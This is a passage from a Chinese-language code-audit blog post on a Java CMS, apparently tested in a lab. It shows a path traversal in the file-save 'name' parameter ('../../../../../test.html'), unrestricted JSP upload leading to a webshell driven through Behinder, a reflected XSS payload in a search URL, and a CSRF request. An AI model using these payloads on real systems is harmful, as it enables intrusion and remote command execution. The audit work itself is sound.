+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=kd>protected</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>save</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>text</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>redirect</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>RedirectAttributes</span><span class=w> </span><span class=n>ra</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Site</span><span class=w> </span><span class=n>site</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Context</span><span class=p>.</span><span class=na>getCurrentSite</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getBase</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>Validations</span><span class=p>.</span><span class=na>uri</span><span class=p>(</span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>base</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CmsException</span><span class=p>(</span><span class=s>&#34;invalidURI&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>FileHandler</span><span class=w> </span><span class=n>fileHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getFileHandler</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>fileHandler</span><span class=p>.</span><span class=na>store</span><span class=p>(</span><span class=n>text</span><span class=p>,</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>logService</span><span class=p>.</span><span class=na>operation</span><span class=p>(</span><span class=s>&#34;opr.webFile.add&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>request</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>logger</span><span class=p>.</span><span class=na>info</span><span class=p>(</span><span class=s>&#34;save file, name={}.&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>name</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ra</span><span class=p>.</span><span class=na>addFlashAttribute</span><span class=p>(</span><span class=s>&#34;refreshLeft&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ra</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;parentId&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ra</span><span class=p>.</span><span class=na>addFlashAttribute</span><span class=p>(</span><span class=n>MESSAGE</span><span class=p>,</span><span class=w> </span><span class=n>SAVE_SUCCESS</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Constants</span><span class=p>.</span><span class=na>REDIRECT_LIST</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>redirect</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>return</span><span class=w> </span><span class=s>&#34;redirect:list.do&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Constants</span><span class=p>.</span><span class=na>REDIRECT_CREATE</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>redirect</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>return</span><span class=w> </span><span class=s>&#34;redirect:create.do&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>ra</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>name</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>return</span><span class=w> </span><span class=s>&#34;redirect:edit.do&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这里也是同样的漏洞，仅过滤了parentId而没有过滤name参数，所以这里也有目录穿透，新建一个文档，输入success，然后抓包。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/cmscp/core/web_file_2/save.do</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.87.148:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>89</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.87.148:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.87.148:8888/cmscp/core/web_file_2/create.do?parentId=%2F1&amp;</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=CA7DD070F74CFE10991C0475CE82606D</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>origName=&amp;parentId=%2F1&amp;position=&amp;redirect=edit&amp;name=test.html&amp;baseName=test&amp;text=success
+</span></span></code></pre></td></tr></table></div></div><p>​ 将name参数修改为../../../../../test.html即可在项目根目录下创建一个test.html文件。</p><p><img src=/p/cs_singlewindow_cms/image-20241210121816150.png width=838 height=595 srcset="/p/cs_singlewindow_cms/image-20241210121816150_hu12403339480149483997.png 480w, /p/cs_singlewindow_cms/image-20241210121816150_hu1974347919972025551.png 1024w" loading=lazy alt=image-20241210121816150 class=gallery-image data-flex-grow=140 data-flex-basis=338px></p><p>​ 不仅如此，我们还发现他也没有对后缀进行任何的过滤，因此，我们可以尝试直接写一个马上去，而且这里甚至不需要使用目录穿透，因为他没有对文件内容进行过滤，所以我们可以直接在jsp文件夹里边写马，如下：</p><p><img src=/p/cs_singlewindow_cms/image-20241210192127345.png width=1177 height=606 srcset="/p/cs_singlewindow_cms/image-20241210192127345_hu13529535924028304121.png 480w, /p/cs_singlewindow_cms/image-20241210192127345_hu12927625317675705593.png 1024w" loading=lazy alt=image-20241210192127345 class=gallery-image data-flex-grow=194 data-flex-basis=466px></p><p>​ 冰蝎链接后执行命令：</p><p><img src=/p/cs_singlewindow_cms/image-20241210192255646.png width=1284 height=452 srcset="/p/cs_singlewindow_cms/image-20241210192255646_hu12366698775480110102.png 480w, /p/cs_singlewindow_cms/image-20241210192255646_hu12719555128512169638.png 1024w" loading=lazy alt=image-20241210192255646 class=gallery-image data-flex-grow=284 data-flex-basis=681px></p><h3 id=xss>XSS</h3><p>​ 经过审计和前端测试，该项目也是存在多个XSS，所以这里只拿出一个较有价值的反射型XSS。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequiresPermissions</span><span class=p>(</span><span class=s>&#34;core:homepage:mail_inbox:list&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;mail_inbox_list.do&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>mailInboxList</span><span class=p>(</span><span class=nd>@RequestParam</span><span class=p>(</span><span class=n>defaultValue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;false&#34;</span><span class=p>)</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=n>unread</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=nd>@PageableDefault</span><span class=p>(</span><span class=n>sort</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;receiveTime&#34;</span><span class=p>,</span><span class=w> </span><span class=n>direction</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Direction</span><span class=p>.</span><span class=na>DESC</span><span class=p>)</span><span class=w> </span><span class=n>Pageable</span><span class=w> </span><span class=n>pageable</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>org</span><span class=p>.</span><span class=na>springframework</span><span class=p>.</span><span class=na>ui</span><span class=p>.</span><span class=na>Model</span><span class=w> </span><span class=n>modelMap</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>User</span><span class=w> </span><span class=n>user</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Context</span><span class=p>.</span><span class=na>getCurrentUser</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]&gt;</span><span class=w> </span><span class=n>params</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Servlets</span><span class=p>.</span><span class=na>getParamValuesMap</span><span class=p>(</span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>Constants</span><span class=p>.</span><span class=na>SEARCH_PREFIX</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Page</span><span class=o>&lt;</span><span class=n>MailInbox</span><span class=o>&gt;</span><span class=w> </span><span class=n>pagedList</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>inboxService</span><span class=p>.</span><span class=na>findAll</span><span class=p>(</span><span class=n>user</span><span class=p>.</span><span class=na>getId</span><span class=p>(),</span><span class=w> </span><span class=n>params</span><span class=p>,</span><span class=w> </span><span class=n>pageable</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>modelMap</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;pagedList&#34;</span><span class=p>,</span><span class=w> </span><span class=n>pagedList</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=s>&#34;core/homepage/mail_inbox_list&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这个控制器的大致逻辑是先检测用户的权限，然后从请求体中获取传参，然后传入findALL进行查找，返回分页后的结果，然后再把结果渲染进模板中最后返回到前端。可见这里并没有对XSS进行过滤或者拦截，我们定位到前端的系统消息-列表的搜索功能点。</p><p>​ URL如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://172.21.87.148:8888/cmscp/core/homepage/mail_inbox_list.do?search_CONTAIN_mailText.subject=test
+</span></span></code></pre></td></tr></table></div></div><p>​ 我们开始构造XSSpayload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>&#34;&gt;<span class=p>&lt;</span><span class=nt>img</span><span class=err>%</span><span class=na>20src</span><span class=o>=</span><span class=s>x</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(&#39;xss&#39;)</span><span class=p>&gt;</span><span class=err>&lt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 访问一下：</p><p><img src=/p/cs_singlewindow_cms/image-20241210194803752.png width=1446 height=432 srcset="/p/cs_singlewindow_cms/image-20241210194803752_hu180922730781089197.png 480w, /p/cs_singlewindow_cms/image-20241210194803752_hu4679360975155480667.png 1024w" loading=lazy alt=image-20241210194803752 class=gallery-image data-flex-grow=334 data-flex-basis=803px></p><p>​ 其余的搜索框也是一样的漏洞。</p><h3 id=csrf>CSRF</h3><p>​ 我们来到TAG管理这里，新建一个TAG，抓包。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/cmscp/core/tag/save.do</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.87.148:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>52</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.87.148:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.87.148:8888/cmscp/core/tag/create.do?</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>_site=1; JSESSIONID=FE1E77A0FA48CA0F95810E8740DBB51E</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>oid=&amp;position=&amp;redirect=edit&amp;name=CSRF&amp;creationDate=
+</span></span></code></pre></td></tr></table></div></div><p>​ 创建CSRF的POC然后模拟管理员访问该链接。</p><p><img src=/p/cs_singlewindow_cms/image-20241210195356700.png width=1616 height=209 srcset="/p/cs_singlewindow_cms/image-20241210195356700_hu1781335581378729179.png 480w, /p/cs_singlewindow_cms/image-20241210195356700_hu4845094002481524316.png 1024w" loading=lazy alt=image-20241210195356700 class=gallery-image data-flex-grow=773 data-flex-basis=1855px></p><p>​ 成功。
+至此该项目审计结束。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/code-audit/>Code Audit</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/wormhole-cms/><div class=article-image><img src=/p/wormhole-cms/cover.c9407c9112bd7e4dc83746c60e2615f9_hu17810225876497504869.png width=250 height=150 loading=lazy alt="Featured image of post wormhole-cms" data-hash="md5-yUB8kRK9fk3IN0bGDiYV+Q=="></div><div class=article-details><h2 class=article-title>wormhole-cms</h2></div></a></article><article class=has-image><a href=/p/jfinalcms/><div class=article-image><img src=/p/jfinalcms/cover.475149eeef9e821b03091311ac435ba9_hu7198081271608463053.png width=250 height=150 loading=lazy alt="Featured image of post JFinalCMS" data-hash="md5-R1FJ7u+eghsDCRMRrENbqQ=="></div><div class=article-details><h2 class=article-title>JFinalCMS</h2></div></a></article><article class=has-image><a href=/p/wetech-cms/><div class=article-image><img src=/p/wetech-cms/cover.369de65cc2233c898fe67f92883c1864_hu3456308394521248238.png width=250 height=150 loading=lazy alt="Featured image of post wetech-cms" data-hash="md5-Np3mXMIjPImP5n+SiDwYZA=="></div><div class=article-details><h2 class=article-title>wetech-cms</h2></div></a></article><article class=has-image><a href=/p/newbee-mall/><div class=article-image><img src=/p/newbee-mall/cover.d0d72115f3faccc22a7ff7c0c38ca3ca_hu6190031081276942614.png width=250 height=150 loading=lazy alt="Featured image of post newbee-mall" data-hash="md5-0NchFfP6zMIqf/fAw4yjyg=="></div><div class=article-details><h2 class=article-title>newbee-mall</h2></div></a></article><article class=has-image><a href=/p/oasys-1/><div class=article-image><img src=/p/oasys-1/cover.983a250cc2b2a88f295e7c7b55c781be_hu10225888204114563353.png width=250 height=150 loading=lazy alt="Featured image of post oasys-1" data-hash="md5-mDolDMKyqI8pXnx7VceBvg=="></div><div class=article-details><h2 class=article-title>oasys-1</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2024 hadagaga blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
